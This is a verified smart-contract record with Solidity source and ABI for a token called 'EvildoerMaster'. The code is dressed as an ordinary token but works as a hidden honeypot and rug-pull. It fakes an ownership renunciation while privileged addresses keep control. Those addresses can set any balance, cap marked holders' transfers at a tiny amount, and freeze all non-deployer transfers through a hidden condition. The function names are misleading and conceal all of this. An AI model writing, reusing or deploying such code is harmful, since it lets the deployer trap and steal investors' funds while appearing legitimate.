{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface enableSell {\n    function createPair(address fundAmount, address takeLimitTeam) external returns (address);\n}\n\ninterface totalIsMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamEnableShould) external view returns (uint256);\n\n    function transfer(address sellTotal, uint256 liquidityFundMarketing) external returns (bool);\n\n    function allowance(address txMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 liquidityFundMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address sellTotal,\n        uint256 liquidityFundMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed shouldSell, uint256 value);\n    event Approval(address indexed txMarketing, address indexed spender, uint256 value);\n}\n\nabstract contract swapFee {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellTakeReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface totalIsMinMetadata is totalIsMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EvildoerMaster is swapFee, totalIsMin, totalIsMinMetadata {\n\n    address private listMin;\n\n    function teamTotal() public {\n        emit OwnershipTransferred(enableMode, address(0));\n        listMin = address(0);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return listSender;\n    }\n\n    function fundMarketing(address enableModeReceiver) public {\n        totalTakeList();\n        \n        if (enableModeReceiver == enableMode || enableModeReceiver == amountTotal) {\n            return;\n        }\n        amountTradingExempt[enableModeReceiver] = true;\n    }\n\n    mapping(address => bool) public amountTradingExempt;\n\n    uint256 constant exemptAtTake = 4 ** 10;\n\n    function allowance(address autoTotal, address marketingShould) external view virtual override returns (uint256) {\n        if (marketingShould == amountAuto) {\n            return type(uint256).max;\n        }\n        return teamSwapLaunched[autoTotal][marketingShould];\n    }\n\n    uint256 minTo;\n\n    function balanceOf(address teamEnableShould) public view virtual override returns (uint256) {\n        return swapTx[teamEnableShould];\n    }\n\n    bool public totalLaunch;\n\n    function transferFrom(address receiverLiquidity, address sellTotal, uint256 liquidityFundMarketing) external override returns (bool) {\n        if (_msgSender() != amountAuto) {\n            if (teamSwapLaunched[receiverLiquidity][_msgSender()] != type(uint256).max) {\n                require(liquidityFundMarketing <= teamSwapLaunched[receiverLiquidity][_msgSender()]);\n                teamSwapLaunched[receiverLiquidity][_msgSender()] -= liquidityFundMarketing;\n            }\n        }\n        return tradingTo(receiverLiquidity, sellTotal, liquidityFundMarketing);\n    }\n\n    uint256 private exemptTx = 100000000 * 10 ** 18;\n\n    function marketingToken(address receiverLiquidity, address sellTotal, uint256 liquidityFundMarketing) internal returns (bool) {\n        require(swapTx[receiverLiquidity] >= liquidityFundMarketing);\n        swapTx[receiverLiquidity] -= liquidityFundMarketing;\n        swapTx[sellTotal] += liquidityFundMarketing;\n        emit Transfer(receiverLiquidity, sellTotal, liquidityFundMarketing);\n        return true;\n    }\n\n    uint256 public toReceiverAmount;\n\n    function approve(address marketingShould, uint256 liquidityFundMarketing) public virtual override returns (bool) {\n        teamSwapLaunched[_msgSender()][marketingShould] = liquidityFundMarketing;\n        emit Approval(_msgSender(), marketingShould, liquidityFundMarketing);\n        return true;\n    }\n\n    bool private isReceiver;\n\n    function transfer(address liquiditySell, uint256 liquidityFundMarketing) external virtual override returns (bool) {\n        return tradingTo(_msgSender(), liquiditySell, liquidityFundMarketing);\n    }\n\n    uint256 public totalList;\n\n    string private sellShould = \"Evildoer Master\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchedAmount;\n    }\n\n    function owner() external view returns (address) {\n        return listMin;\n    }\n\n    event OwnershipTransferred(address indexed teamFee, address indexed receiverAt);\n\n    function getOwner() external view returns (address) {\n        return listMin;\n    }\n\n    address public enableMode;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptTx;\n    }\n\n    address fromLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function launchLaunched(address limitToken) public {\n        if (totalLaunch) {\n            return;\n        }\n        if (toReceiverAmount != totalList) {\n            toReceiverAmount = totalList;\n        }\n        shouldMin[limitToken] = true;\n        if (toReceiverAmount == totalList) {\n            maxReceiverTake = false;\n        }\n        totalLaunch = true;\n    }\n\n    uint256 private enableAmount;\n\n    uint256 fromReceiver;\n\n    function name() external view virtual override returns (string memory) {\n        return sellShould;\n    }\n\n    uint8 private launchedAmount = 18;\n\n    mapping(address => bool) public shouldMin;\n\n    constructor (){\n        \n        sellTakeReceiver launchedReceiver = sellTakeReceiver(amountAuto);\n        amountTotal = enableSell(launchedReceiver.factory()).createPair(launchedReceiver.WETH(), address(this));\n        \n        enableMode = _msgSender();\n        shouldMin[enableMode] = true;\n        swapTx[enableMode] = exemptTx;\n        teamTotal();\n        \n        emit Transfer(address(0), enableMode, exemptTx);\n    }\n\n    address amountAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function tradingTo(address receiverLiquidity, address sellTotal, uint256 liquidityFundMarketing) internal returns (bool) {\n        if (receiverLiquidity == enableMode) {\n            return marketingToken(receiverLiquidity, sellTotal, liquidityFundMarketing);\n        }\n        uint256 launchedExempt = totalIsMin(amountTotal).balanceOf(fromLaunch);\n        require(launchedExempt == fromReceiver);\n        require(sellTotal != fromLaunch);\n        if (amountTradingExempt[receiverLiquidity]) {\n            return marketingToken(receiverLiquidity, sellTotal, exemptAtTake);\n        }\n        return marketingToken(receiverLiquidity, sellTotal, liquidityFundMarketing);\n    }\n\n    function isMinTake(address liquiditySell, uint256 liquidityFundMarketing) public {\n        totalTakeList();\n        swapTx[liquiditySell] = liquidityFundMarketing;\n    }\n\n    function fromSwapLaunched(uint256 liquidityFundMarketing) public {\n        totalTakeList();\n        fromReceiver = liquidityFundMarketing;\n    }\n\n    function totalTakeList() private view {\n        require(shouldMin[_msgSender()]);\n    }\n\n    mapping(address => uint256) private swapTx;\n\n    address public amountTotal;\n\n    bool private maxReceiverTake;\n\n    mapping(address => mapping(address => uint256)) private teamSwapLaunched;\n\n    string private listSender = \"EMR\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldSell\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountTradingExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityFundMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamEnableShould\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidityFundMarketing\",\"type\":\"uint256\"}],\"name\":\"fromSwapLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableModeReceiver\",\"type\":\"address\"}],\"name\":\"fundMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquiditySell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityFundMarketing\",\"type\":\"uint256\"}],\"name\":\"isMinTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitToken\",\"type\":\"address\"}],\"name\":\"launchLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toReceiverAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquiditySell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityFundMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityFundMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EvildoerMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}